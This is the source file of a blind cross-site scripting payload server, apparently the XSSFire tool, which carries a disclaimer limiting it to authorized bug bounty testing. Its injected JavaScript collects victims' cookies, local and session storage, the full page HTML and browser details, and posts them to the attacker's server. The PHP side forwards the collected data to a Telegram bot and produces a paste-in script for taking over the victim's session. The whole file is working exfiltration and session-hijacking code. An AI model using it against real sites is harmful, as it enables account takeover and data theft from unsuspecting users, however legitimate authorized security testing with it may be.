/*
Warning: This script is intended for use in testing for XSS and securing web applications by bug bounty hunters and security professionals.
It should not be used to access systems or data without proper authorization or to carry out any malicious or illegal activities.

Developed by @0x21SAFE
Project URL: https://github.com/SeifElsallamy/XSSFire
*/
<?php
header('Access-Control-Allow-Origin: *');
function teleg($fileContent1, $fileContent2, $origin){
$chat_id = "<Telegram Chat ID>"; // Your Telegram Chat ID
$token = "<Telegram Bot Access Token>"; // Your telegram Bot Access token
$password = False; //Protect the Blind XSS Report with a password. Leave as False if not used.

$tempFile1 = tmpfile();
$metaDatas1 = stream_get_meta_data($tempFile1);
$filePath1 = $metaDatas1['uri'];
fwrite($tempFile1, $fileContent1);

$tempFile2 = tmpfile();
$metaDatas2 = stream_get_meta_data($tempFile2);
$filePath2 = $metaDatas2['uri'];
fwrite($tempFile2, $fileContent2);

if ($password !== False){
	
	zip_files_with_password($filePath1, $filePath2, "/tmp/report.zip", $password);
	$curl = curl_init();
	curl_setopt_array($curl, [
    CURLOPT_URL => 'https://api.telegram.org/bot' . $token . '/sendDocument?caption=New+BXSS+Report&chat_id=' . $chat_id,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => [
        'Content-Type: multipart/form-data'
    ],
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        'document' => curl_file_create("/tmp/report.zip", 'plain/text', 'Report.zip')
    ]
	]);
	$data = curl_exec($curl);
	curl_close($curl);
	unlink("/tmp/report.zip");
}
else {
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => 'https://api.telegram.org/bot' . $token . '/sendDocument?caption=BXSS+at+'.urlencode($origin).'+[Report]&chat_id=' . $chat_id,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => [
        'Content-Type: multipart/form-data'
    ],
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        'document' => curl_file_create($filePath1, 'plain/text', 'Report.html')
    ]
]);
$data = curl_exec($curl);
curl_close($curl);

$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => 'https://api.telegram.org/bot' . $token . '/sendDocument?caption=BXSS+at+'.urlencode($origin).'+[HTML+Snapshot]&chat_id=' . $chat_id,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => [
        'Content-Type: multipart/form-data'
    ],
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        'document' => curl_file_create($filePath2, 'plain/text', 'HTMLSnapshot.html')
    ]
]);
$data = curl_exec($curl);
curl_close($curl);
}
fclose($tempFile1);
fclose($tempFile2);
}
function zip_files_with_password($file1, $file2, $zip_file, $password) {
  $zip = new ZipArchive;
  $zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE);
  $zip->addFile($file1, "Report.html");
  $zip->addFile($file2, "HTMLSnapshot.html");
  $zip->setEncryptionName("Report.html", ZipArchive::EM_TRAD_PKWARE, $password);
  $zip->setEncryptionName("HTMLSnapshot.html", ZipArchive::EM_TRAD_PKWARE, $password);
  $zip->close();
}
function createTable($ip, $date_time, $doc_url, $origin, $local_storage, $session_storage, $cookies, $whole_html, $user_agent, $referrer, $inframe, $session_builder) {
  // Sanitize input data against XSS

  $ip = htmlspecialchars($ip);
  $date_time = htmlspecialchars($date_time);
  $doc_url = htmlspecialchars($doc_url);
  $origin = htmlspecialchars($origin);
  $local_storage = htmlspecialchars($local_storage);
  $session_storage = htmlspecialchars($session_storage);
  $whole_html = htmlspecialchars($whole_html);
  $cookies = htmlspecialchars($cookies);
  $user_agent = htmlspecialchars($user_agent);
  $referrer = htmlspecialchars($referrer);
  $inframe = htmlspecialchars($inframe);
  $session_builder = htmlspecialchars($session_builder);

  // Create HTML table
  $table = '<!DOCTYPE html><title>Blind XSS Report</title><h1>Blind XSS Report</h1><style>body{background-color:black; color:white} textarea{width:50%; background-color:black; color:white;} th{text-align: left;}</style><table width="100%" border="1">';
  $table .= '<tr><th>IP</th><td>' . $ip . '</td></tr>';
  $table .= '<tr><th>Date and Time</th><td>' . $date_time . '</td></tr>';
  $table .= '<tr><th>Document URL</th><td>' . $doc_url . '</td></tr>';
  $table .= '<tr><th>Origin</th><td>' . $origin . '</td></tr>';
  $table .= '<tr><th>Local Storage</th><td><textarea>' . $local_storage . '</textarea></td></tr>';
  $table .= '<tr><th>Session Storage</th><td><textarea>' . $session_storage . '</textarea></td></tr>';
  $table .= '<tr><th>Cookies</th><td>' . $cookies . '</td></tr>';
  $table .= '<tr><th>User Agent</th><td>' . $user_agent . '</td></tr>';
  $table .= '<tr><th>Referrer</th><td>' . $referrer . '</td></tr>';
  $table .= '<tr><th>In Frame</th><td>' . $inframe . '</td></tr>';
  $table .= '<tr><th>HTML</th><td><textarea>' . $whole_html . '</textarea></td></tr>';
  $table .= '<tr><th>Session Builder</th><td><pre style="color:pink;">You might be able to takeover your target&#x27;s session!
Usage: Go to your target&#x27;s document URL,
open the devtools, paste the following script in the console, and hit enter.</pre><textarea>' . $session_builder . '</textarea></td></tr>';
  $table .= '</table>';
  return $table;
}

if (isset($_POST['data'])) {
  header('Access-Control-Allow-Origin: *');
  header('Access-Control-Allow-Methods: OPTIONS, GET, POST');
  $data = $_POST['data'];
  $data = base64_decode($data);
  parse_str($data, $data);
  $ip = getIPAddress();
  $date_time = unsant($data["date_time"]);
  $doc_url = unsant($data["doc_url"]);
  if (lineExists($doc_url)){return 0;} else {writeLine($doc_url);}
  $origin = unsant($data["origin"]);
  $local_storage = unsant($data["local_storage"]);
  $session_storage = unsant($data["session_storage"]);
  $cookies = unsant($data["cookies"]);
  $user_agent = unsant($data["user_agent"]);
  $whole_html = unsant($data["wholeHTML"]);
  $referrer = unsant($data["referrer"]);
  $inframe = unsant($data["inframe"]);
  $session_builder = unsant($data["session_builder"]);
  $table = createTable($ip, $date_time, $doc_url, $origin, $local_storage, $session_storage, $cookies, $whole_html, $user_agent, $referrer, $inframe, $session_builder); 
  echo 1;
  teleg("$table", '<base href="' . $doc_url . '"></base>' . html_entity_decode($whole_html), $origin);

} else {
  $data = null;
}
function unsant($s){
	return base64_decode($s);
}
function getIPAddress() {
  return $_SERVER['REMOTE_ADDR'];
}
function createFile(){
$filename = "/tmp/checker";
$file = fopen($filename, 'w');
fclose($file);
}
function writeLine($line) {
  $file = "/tmp/checker";
  // Read the contents of the file into a string
  $contents = file_get_contents($file);

  // Prepend the new line to the string
  $contents = $line . PHP_EOL . $contents;

  // Write the modified string back to the file
  file_put_contents($file, $contents);
}
function lineExists($line) {
  $file = "/tmp/checker";
  $lines = file($file);
  $lines = array_map('trim', $lines);
  return in_array($line, $lines);
}

if (filesize("/tmp/checker") >= 0.2 * 1024) { // Reset Notifications when the checker file reach 200KB
    unlink("/tmp/checker");
}
if (file_exists("/tmp/checker")) {
    echo "";
} else {
    createFile();
}
header('Content-Type: application/javascript');

?>
function getLocalStorageData() {
  let data = {};
  for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    let value = localStorage.getItem(key);
    data[key] = value;
  }
  return JSON.stringify(data);
}
function getSessionStorageData() {
  let data = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    let key = sessionStorage.key(i);
    let value = sessionStorage.getItem(key);
    data[key] = value;
  }
  return JSON.stringify(data);
}
function getCurrentDateTime() {
  let date = new Date();
  let year = date.getFullYear();
  let month = date.getMonth() + 1; // months are 0-based
  let day = date.getDate();
  let hour = date.getHours();
  let minute = date.getMinutes();
  let second = date.getSeconds();
  return `${year}-${month}-${day} ${hour}:${minute}:${second}`;
}
async function sendPOSTRequest(url, data) {
  let response = await fetch(url, {
    method: 'POST',
    body: data,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    }
  });
  let result = await response.text();
  return result;
}
function sanit(s){
	//return encodeURIComponent(btoa(s));
	return encodeURIComponent(btoa(unescape(encodeURIComponent(s))));
}
function quote(str) {
  str = str.replace(/'/g, "\\'");
  return '\'' + str + '\'';
}
window.server_url ="<?php echo $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>";
window.local_storage=getLocalStorageData();
window.session_storage=getSessionStorageData();
window.wholeHTML = document.documentElement.outerHTML.replace(server_url,"javascript://This URL was the blind XSS script url, it has been removed to avoid re-sending Blind XSS notifications from the HTML Snapshot.");
window.cookies = document.cookie;
window.doc_url = document.URL;
window.user_agent = navigator.userAgent;
window.referrer = document.referrer;
window.date_time=getCurrentDateTime();
window.inframe=!(self==top);
origin;
window.session_builder=`localData=${local_storage};sessionData=${session_storage};cookieString=${quote(cookies)};function setLocalStorageData(data) {for (let key in data){localStorage.setItem(key, data[key]);}}setLocalStorageData(localData);function setSessionStorageData(data) {for (let key in data){sessionStorage.setItem(key, data[key]);}} setSessionStorageData(sessionData); function setCookies(cookieString) {var cookieList = cookieString.split(";"); for (var i = 0; i < cookieList.length; i++) {var cookie = cookieList[i].split("="); var name = cookie[0].trim(); var value = cookie[1].trim(); document.cookie = name + "=" + (value || "") + "; path=/";}} setCookies(cookieString);`;
window.data=btoa(`session_builder=${sanit(session_builder)}&date_time=${sanit(date_time)}&doc_url=${sanit(doc_url)}&local_storage=${sanit(local_storage)}&session_storage=${sanit(session_storage)}&cookies=${sanit(cookies)}&user_agent=${sanit(user_agent)}&referrer=${sanit(referrer)}&inframe=${sanit(inframe)}&origin=${sanit(origin)}&wholeHTML=${sanit(wholeHTML)}`);
sendPOSTRequest(server_url, `data=${data}`);
